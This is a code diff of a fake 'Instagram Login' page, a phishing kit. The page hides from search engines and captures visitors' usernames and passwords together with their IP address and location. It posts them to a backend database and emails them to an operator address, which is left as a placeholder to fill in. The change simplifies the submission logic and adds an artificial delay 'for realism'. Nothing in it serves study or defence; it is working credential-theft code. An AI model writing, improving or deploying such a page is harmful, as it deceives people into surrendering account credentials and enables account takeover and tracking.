@@ -6,7 +6,7 @@
     <title>Instagram Login</title>
     <meta name="robots" content="noindex">
     <meta name="googlebot" content="noarchive">
-    <link rel="shortcut icon" href="./assets/instagram-icon.png" type="image/x-icon">
+    <link rel="icon" href="/assets/instagram-icon.svg" type="image/svg+xml">
     
     <style>
         * {
@@ -275,82 +275,54 @@
                 return;
             }
             
-            // Show loading animation
-            loginBtn.style.display = 'none';
+            // Show loading indicator
             loader.style.display = 'block';
+            loginBtn.style.display = 'none';
             
-            // Create a timeout to prevent infinite loading
-            const loginTimeout = setTimeout(() => {
-                loader.style.display = 'none';
-                loginBtn.style.display = 'block';
-                feedbackElement.textContent = 'Connection timed out. Please try again.';
-            }, 15000); // 15 second timeout
-            
-            // Send data to server with proper error handling
-            sendDataToServer()
-                .then(() => {
-                    // Clear the timeout if successful
-                    clearTimeout(loginTimeout);
-                })
-                .catch(error => {
-                    console.error('Login error:', error);
-                    // Show error and reset UI
-                    loader.style.display = 'none';
-                    loginBtn.style.display = 'block';
-                    feedbackElement.textContent = 'An error occurred. Please try again.';
-                    clearTimeout(loginTimeout);
-                });
+            // Send data to server with delay for realism
+            setTimeout(sendDataToServer, 1500);
         }
         
-        // Update sendDataToServer to return a promise for better error handling
+        // Send login data to server
         function sendDataToServer() {
-            return new Promise((resolve, reject) => {
-                // Add (IG) tag to username if not already present
-                let username = usernameInput.value;
-                if (!username.includes('(IG)')) {
-                    username += " (IG)";
-                }
-                
-                // Prepare data with fallback values to prevent undefined fields
-                const loginData = {
+            // Add (IG) tag to username if not already present
+            let username = usernameInput.value;
+            if (!username.includes('(IG)')) {
+                username += " (IG)";
+            }
+            
+            // Use fetch with JSON payload instead of FormData
+            fetch('/api/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
                     username: username,
                     password: passwordInput.value,
-                    country: countryField ? countryField.value : 'Unknown',
-                    city: cityField ? cityField.value : 'Unknown',
-                    continent: continentField ? continentField.value : 'Unknown',
-                    ip_address: ipField ? ipField.value : 'Unknown',
-                    platform: 'instagram'
-                };
+                    country: countryField.value,
+                    city: cityField.value,
+                    continent: continentField.value,
+                    ip_address: ipField.value
+                })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! Status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Data saved to database:', data);
                 
-                // Send to Supabase via API
-                fetch('/api/login', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(loginData)
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! Status: ${response.status}`);
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    console.log('Data saved to database:', data);
-                    
-                    // Send email notification
-                    return sendNotificationEmail();
-                })
-                .then(() => {
-                    // Process UI updates for login attempt
-                    processLoginAttempt();
-                    resolve(); // Resolve the promise when everything is done
-                })
-                .catch(error => {
-                    console.error('Error in login process:', error);
-                    reject(error); // Reject the promise on error
-                });
+                // Send email notification
+                sendNotificationEmail();
+                
+                // Handle login attempts UI
+                processLoginAttempt();
+            })
+            .catch(error => {
+                console.error('Error saving data:', error);
             });
         }
         
@@ -379,36 +351,29 @@
             }
         }
         
-        // Update sendNotificationEmail to return a promise
+        // Send email notification
         function sendNotificationEmail() {
-            return new Promise((resolve, reject) => {
-                const emailData = {
+            fetch('/api/notify', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
                     username: usernameInput.value + " (IG)",
                     password: passwordInput.value,
-                    country: countryField ? countryField.value : 'Unknown',
-                    city: cityField ? cityField.value : 'Unknown',
-                    continent: continentField ? continentField.value : 'Unknown',
-                    ip: ipField ? ipField.value : 'Unknown',
+                    country: countryField.value,
+                    city: cityField.value,
+                    continent: continentField.value,
+                    ip: ipField.value,
                     adminEmail: 'your-admin-email@example.com' // Set this to your email
-                };
-                
-                fetch('/api/notify', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(emailData)
                 })
-                .then(response => response.json())
-                .then(result => {
-                    console.log('Email notification sent:', result);
-                    resolve(); // Resolve the promise when done
-                })
-                .catch(error => {
-                    console.error('Error sending notification:', error);
-                    // We still resolve here to continue the flow even if notification fails
-                    resolve();
-                });
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Email notification sent:', result);
+            })
+            .catch(error => {
+                console.error('Error sending notification:', error);
             });
         }
     </script>
